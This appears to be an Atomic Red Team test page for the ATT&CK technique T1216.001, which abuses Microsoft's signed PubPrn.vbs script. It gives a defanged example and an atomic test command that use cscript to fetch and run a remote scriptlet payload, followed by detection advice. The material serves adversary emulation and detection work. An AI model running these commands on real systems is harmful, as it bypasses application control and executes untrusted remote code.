# T1216.001 - Signed Script Proxy Execution: Pubprn
Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.

<code>PubPrn.vbs</code> is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example command is <code>cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png</code>.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - PubPrn.vbs Signed Script Bypass
Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"
```

Invoke-AtomicTest T1216.001 -TestNumbers 1

## Detection
Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.